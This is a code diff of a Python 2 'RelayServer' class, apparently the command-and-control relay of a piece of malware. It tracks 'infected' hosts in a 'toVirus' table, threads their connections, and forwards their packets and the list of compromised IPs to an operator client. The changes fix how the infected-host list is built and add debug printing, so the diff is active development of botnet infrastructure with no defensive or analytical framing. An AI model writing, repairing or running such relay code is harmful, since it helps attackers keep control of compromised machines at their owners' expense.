@@ -47,17 +47,16 @@ class RelayServer:
     def sendIPList(self,address=""):
         state = "100"
         ips = self.toVirus.keys()
+        data = ""
         for ip in ips:
-            data = ip + ":" + self.toVirus[ip][2]
-        else:
-            data = ""
+            data += ip + ":" + self.toVirus[ip][2]
         length = len(data)
 
         pkt = Packet()
         pkt.state = state
         pkt.length = str(length)
         pkt.data = data
-
+        print "IPList: " + data
         if address != "":
             pkt.returnIP = address[0]
             self.enqueueToClient(pkt)
@@ -69,7 +68,7 @@ class RelayServer:
         print address[0] + " infected!"
         q = Queue()
         self.toVirus[address[0]] = (client,q,None)
-        self.sendIPList()
+        # self.sendIPList()
         t = threading.Thread(target=self.receiveFromVirus,args=[client,address])
         t.start()
         threading.Thread(target=self.dequeue,args=[q,client,t]).start()
@@ -79,6 +78,7 @@ class RelayServer:
             pkt = Packet()
             try:
                 pkt.construct(s)
+                print pkt
             except socket.error as error:
                 if error.errno == 10054 or error.errno == 104:
                     del self.toVirus[address[0]]
@@ -90,6 +90,8 @@ class RelayServer:
             if pkt.state == '100':
                 tup = self.toVirus[address[0]]
                 self.toVirus[address[0]] = (tup[0],tup[1],pkt.data)
+                self.sendIPList()
+                print pkt.data
             else: self.enqueueToClient(pkt)
 
 
